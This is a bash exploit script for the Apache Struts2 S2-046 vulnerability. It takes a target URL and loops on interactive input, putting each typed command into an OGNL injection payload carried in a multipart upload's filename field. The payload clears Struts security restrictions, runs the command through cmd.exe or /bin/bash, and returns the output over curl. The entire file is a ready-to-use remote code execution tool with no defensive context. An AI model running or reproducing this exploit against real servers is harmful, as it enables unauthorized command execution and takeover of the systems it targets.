#!/bin/bash
###################################
#--------exp st2-046------------#
#------- kingos ----------------#
#################################
url=$1
boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
Content_Length="Content-Length"="10000000"
shift
shift
while true
do
####-----解决退格问题-----#####
stty erase ^H
###-----输入内容执行循环输出输入-----#####
read -p "input a exp:"  exp
if [ "$exp" != "" ]; then

payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$exp"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}") 
 
printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
else
exit 0
fi
done

